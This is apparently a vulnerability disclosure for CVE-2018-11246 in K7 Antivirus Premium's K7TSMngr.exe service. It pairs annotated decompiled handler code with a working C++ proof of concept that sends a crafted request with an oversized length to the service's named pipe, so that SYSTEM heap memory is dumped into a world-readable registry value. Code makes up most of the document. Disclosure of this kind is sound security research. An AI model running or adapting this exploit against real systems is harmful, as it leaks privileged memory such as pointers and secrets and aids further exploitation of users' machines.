# CVE-2018-11246

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details

Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x10012, it is possible to dump arbitary memory from a SYSTEM heap into a Registry value which can be read from a lower integrity process. This may contain sensitive information, which is not ideal, or be used as an information disclosure for further exploitation.

```C++
#pragma pack(push)
#pragma pack(1)
typedef struct _unk5
{
    BYTE bRegOperationType;
    CHAR lpValueName[0];
    // Other parts...
} unk5;
#pragma pack(pop)

typedef struct _unk4
{
    DWORD dwLessThanOrEqualInputSize;
    DWORD dwCount;
    unk5 stRegStuff; 
} unk4;

HKEY __stdcall UpdateKeysInUpdates(unsigned int dwInputSize, unk4 *pInput, int dwOutputSize, int pOutput, int a5)
{

    if ( dwInputSize < 8 )
        return 0;
    pUnk4 = pInput;
    dwCount = pInput->dwCount;
    dwCount_1 = (unk4 *)pInput->dwCount;
    if ( pUnk4->dwLessThanOrEqualInputSize > dwInputSize || dwCount > 0x80 )
        return 0;
    result = RegOpenKeyWrapper(HKEY_LOCAL_MACHINE, "SOFTWARE\\K7 Computing\\K7TotalSecurity\\CommonInfo\\Updates");
    hKey = result;
    if ( result )
    {
        pCurrent = &pUnk4->stRegStuff;
        dwInputSizea = 0;
        if ( dwCount )
        {
            do
            {
                lpValueName = &pCurrent->lpValueName;
                dwValueNameLength = lstrlenA(&pCurrent->lpValueName);
                bRegType = pCurrent->RegType;
                pValueData = (PBYTE)&lpValueName[dwValueNameLength + 1];
                switch ( bRegType )
                {
                // ...
                case 'B':
                    v14 = *(_DWORD *)pValueData;
                    cbData = *(_DWORD *)pValueData;
                    // VULN: cbData is the amount of data to write to the registry, and the buffer
                    // after this field is the amount to write. At no point is this actually
                    // validated against the outer length.
                    pData = (BYTE *)&lpValueName[dwValueNameLength + 5];

                    // VULN: This does the actual writing. We can set cbData to any length we like
                    // not provide any more data on our buffer and it will write all of that to 
                    // a value in the Updates key which we can read later. Worse case is that we 
                    // kill the process which we were after for another bug. Best case is that
                    // we can potentially grab some sensitive info, or leak a cookie or something.
                    // The PoC didn't go much further than illustrating you can dump memory.
                    RegSetValueExA_Binary(hKey, lpValueName, pData, cbData);
                    pCurrent = (unk5 *)&pData[v14];
                    break;
                default:
                    goto LABEL_17;
                }
                ++dwInputSizea;
            }

```


# PoC Code
```C++
#include <Windows.h>
#include <sddl.h>
#include <stdio.h>
#include <winternl.h>


/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////


//
// Vulnerability
//		Type: 
//			Out-of-bounds Read, and Information Disclosure
//
//		Description: 
//			In the handler for 0x10012, you can write a binary registry value and set the value to 
//			be larger than the value of the input value. This means we can dump the contents of a
//			heap in a SYSTEM process to a registry. This may be sensitive information, or heap 
//			cookies, pointers, useful information for further exploitation. This information is 
//			accessible then from a lower integrity level process.
//
//			The PoC will create a Vuln_HeapDumped binary value in the 
//			HKLM\Software\K7 Computing\K7TotalSecurity\CommonInfo\Updates\
//				Value:	Vuln_HeapDumped		REG_BINARY		A x 0x20	<HEAP Dumped)

void Vuln_LogicFlaw_OutOfBoundsReadAndDisclosure(DWORD dwToDump)
{
	PBYTE pData = (PBYTE)AllocPrecise(0x10000);

	// Set the first DWORD, needs to be <= input size
	PDWORD pdwValue1 = (PDWORD)pData;
	*pdwValue1 = 1;

	// We have one key to set
	PDWORD pdwCount = (PDWORD)(pData + 4);
	*pdwCount = 1;

	// Registry Pointer:
	// BYTE:	'B' - we want to make a binary value 
	// PSTR:	Vuln_HeapDumped
	// DWORD:	Size of data
	// BYTE[]:  Data - we have made this small as we are going to dump off the end.
	PBYTE pRegCurrent = pData + 8;
	*pRegCurrent = 'B';
	++pRegCurrent;

	PSTR pszValueName = "Vuln_HeapDumped";
	memcpy(pRegCurrent, pszValueName, strlen(pszValueName));
	pRegCurrent += strlen(pszValueName) + 1;
	PDWORD pdwDataSize = (PDWORD)pRegCurrent;
	*pdwDataSize = dwToDump;
	pRegCurrent += 4;
	memset(pRegCurrent, 'A', 0x20);
	pRegCurrent += 0x20;


	DWORD dwSize = pRegCurrent - pData;
	CallPipeFunction(0x10012, pData, dwSize, NULL, 0);
}

int main(int argc, char** argv)
{
	if (argc != 2)
	{
		printf("Usage: <SizeToDump>\r\n");
		return 1;
	}
	DWORD dwSize = strtoul(argv[1], 0, 10);
	Vuln_LogicFlaw_OutOfBoundsReadAndDisclosure(dwSize);
}


```